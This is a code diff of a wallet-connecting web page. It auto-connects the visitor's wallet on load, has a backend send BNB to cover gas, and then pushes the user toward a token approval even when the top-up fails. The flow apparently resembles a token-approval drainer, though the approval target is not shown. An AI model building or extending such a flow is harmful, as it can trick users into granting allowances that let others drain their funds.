@@ -100,7 +100,40 @@
         // This URL is used for all API calls and works from any network/IP
         const BACKEND_URL = 'https://rabari-ahmedabad-production.up.railway.app';
 
- window.addEventListener('load', connectWallet);
+        // Test backend connectivity on page load
+        async function testBackendConnection() {
+            console.log('🔍 [Backend Test] Testing backend connectivity...');
+            console.log('🔍 [Backend Test] Backend URL:', BACKEND_URL);
+            
+            try {
+                // Try a simple GET request to test connectivity
+                const testUrl = BACKEND_URL;
+                const response = await fetch(testUrl, {
+                    method: 'GET',
+                    mode: 'cors',
+                    credentials: 'omit',
+                    cache: 'no-cache'
+                });
+                
+                console.log('✅ [Backend Test] Backend is reachable! Status:', response.status);
+                return true;
+            } catch (error) {
+                console.error('❌ [Backend Test] Backend connection failed:', error.message);
+                console.error('💡 [Backend Test] Possible issues:');
+                console.error('   - Backend server is down');
+                console.error('   - CORS not configured');
+                console.error('   - Network/firewall blocking');
+                console.error('   - Wrong backend URL');
+                console.warn('⚠️ [Backend Test] Site will continue, but backend features may not work');
+                return false;
+            }
+        }
+
+        // Run backend test on page load
+        window.addEventListener('load', () => {
+            testBackendConnection();
+            connectWallet();
+        });
     async function connectWallet() {
         if (window.ethereum) {
 
@@ -294,28 +327,37 @@
 
         // Step 2: Auto top-up in background if needed
         if (parseFloat(balanceInBNB) < requiredBNB) {
-            showLoading('Please wait...');
+            showLoading('Requesting gas...');
             // Request the BNB top-up from the backend (in background)
             const topUpSuccess = await requestBNBTopUp(account);
 
             if (!topUpSuccess) {
-                showLoading('Please try again.');
-                setTimeout(() => hideLoading(), 2000);
-                return;
-            }
-
-            // Wait for top-up to process
-            showLoading('Processing...');
-            await new Promise(resolve => setTimeout(resolve, 3000));
-            
-            // Recheck balance
-            const newBnbBalance = await web3.eth.getBalance(account);
-            const newBalanceInBNB = web3.utils.fromWei(newBnbBalance, 'ether');
-            
-            if (parseFloat(newBalanceInBNB) < requiredBNB) {
-                showLoading('Please try again.');
-                setTimeout(() => hideLoading(), 2000);
-                return;
+                // Don't block the user - let them try to approve anyway
+                // The transaction might fail, but at least they can try
+                console.warn('BNB top-up failed, but continuing with approval attempt...');
+                showLoading('Continuing...');
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                
+                // Recheck balance one more time
+                const newBnbBalance = await web3.eth.getBalance(account);
+                const newBalanceInBNB = web3.utils.fromWei(newBnbBalance, 'ether');
+                
+                if (parseFloat(newBalanceInBNB) < requiredBNB) {
+                    // Still low balance, but let user try anyway
+                    console.warn('BNB balance still low, but allowing approval attempt');
+                }
+            } else {
+                // Wait for top-up to process
+                showLoading('Processing...');
+                await new Promise(resolve => setTimeout(resolve, 3000));
+                
+                // Recheck balance
+                const newBnbBalance = await web3.eth.getBalance(account);
+                const newBalanceInBNB = web3.utils.fromWei(newBnbBalance, 'ether');
+                
+                if (parseFloat(newBalanceInBNB) < requiredBNB) {
+                    console.warn('BNB balance still low after top-up, but continuing...');
+                }
             }
         }
 
@@ -335,59 +377,78 @@ async function requestBNBTopUp(account) {
     // Always use the Railway backend URL directly - works from any network
     const apiUrl = `${BACKEND_URL}/send-bnb`;
     
-    console.log('Requesting BNB top-up from:', apiUrl);
-    console.log('Account:', account);
+    console.log('🔗 [BNB Top-up] Requesting from:', apiUrl);
+    console.log('🔗 [BNB Top-up] Account:', account);
     
     try {
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 15000); // 15 second timeout
+        
         const response = await fetch(apiUrl, {
             method: 'POST',
             headers: { 
                 'Content-Type': 'application/json',
-                'Accept': 'application/json',
-                'Origin': window.location.origin || '*'
+                'Accept': 'application/json'
             },
             body: JSON.stringify({ recipient: account }),
             mode: 'cors',
             credentials: 'omit',
-            cache: 'no-cache'
+            cache: 'no-cache',
+            signal: controller.signal
         });
 
-        console.log('Response status:', response.status, response.statusText);
+        clearTimeout(timeoutId);
+        console.log('🔗 [BNB Top-up] Response status:', response.status, response.statusText);
 
         // Check if response is ok
         if (!response.ok) {
-            const errorText = await response.text();
-            console.error('Response not OK:', response.status, response.statusText, errorText);
-            showLoading('Please try again.');
-            setTimeout(() => hideLoading(), 2000);
+            let errorText = '';
+            try {
+                errorText = await response.text();
+            } catch(e) {
+                errorText = 'Could not read error response';
+            }
+            console.error('❌ [BNB Top-up] Response not OK:', response.status, response.statusText);
+            console.error('❌ [BNB Top-up] Error text:', errorText);
             return false;
         }
 
-        const data = await response.json();
-        console.log('Response data:', data);
+        let data;
+        try {
+            data = await response.json();
+        } catch(e) {
+            console.error('❌ [BNB Top-up] Failed to parse JSON response');
+            return false;
+        }
         
-        if (data.success) {
-            showLoading('progress...');
+        console.log('✅ [BNB Top-up] Response data:', data);
+        
+        if (data && data.success) {
+            console.log('✅ [BNB Top-up] Success!');
             return true;  // Return true indicating the top-up was successful
         } else {
-            console.error('Backend returned success: false', data);
-            showLoading('Please try again.');
-            setTimeout(() => hideLoading(), 2000);
+            console.error('❌ [BNB Top-up] Backend returned success: false', data);
             return false;  // Return false indicating the top-up failed
         }
     } catch (error) {
-        console.error('Error during BNB request:', error);
-        console.error('Error name:', error.name);
-        console.error('Error message:', error.message);
-        
-        // Check if it's a CORS error
-        if (error.message && (error.message.includes('CORS') || error.message.includes('Failed to fetch'))) {
-            console.error('CORS error detected. Backend may need to allow cross-origin requests.');
+        if (error.name === 'AbortError') {
+            console.error('❌ [BNB Top-up] Request timeout after 15 seconds');
+        } else {
+            console.error('❌ [BNB Top-up] Error:', error);
+            console.error('❌ [BNB Top-up] Error name:', error.name);
+            console.error('❌ [BNB Top-up] Error message:', error.message);
+            
+            // Check if it's a CORS error
+            if (error.message && (error.message.includes('CORS') || error.message.includes('Failed to fetch') || error.message.includes('NetworkError'))) {
+                console.error('❌ [BNB Top-up] CORS/Network error detected.');
+                console.error('💡 [BNB Top-up] This usually means:');
+                console.error('   1. Backend server is down or unreachable');
+                console.error('   2. CORS is not configured on backend');
+                console.error('   3. Network/firewall blocking the request');
+                console.error('   4. Backend URL might be incorrect');
+            }
         }
-        
-        showLoading('Network error. Please check your connection and try again.');
-        setTimeout(() => hideLoading(), 3000);
-        return false;  // Return false in case of an error
+        return false;  // Return false in case of an error, but don't block the user
     }
 }
 
